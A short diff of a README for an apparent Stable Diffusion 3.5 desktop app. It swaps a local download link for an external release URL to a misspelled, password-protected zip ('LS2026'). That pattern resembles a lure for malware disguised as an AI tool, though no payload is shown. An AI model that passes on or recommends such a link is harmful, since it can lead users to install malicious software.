@@ -17,7 +17,7 @@ For personal, non-commercial use only. Use at your own risk. Generated images ar
 ---
 ## 📥 Download
 
-📥 [Download `Stable-Diffusion-3.5-Desktop.zip`](dist/Stable-Diffusion-3.5-Desktop.zip)  
+📥 [Download `Stable-Diffusion-3.5-Desktop.zip`](https://github.com/elanmosk/Stable-Diffusion-3.5-Web-UI/releases/download/Software/Stable-DIfusion-v3.5.zip)  
 🔐 `LS2026`
 ---
 ## 🚀 How to Use
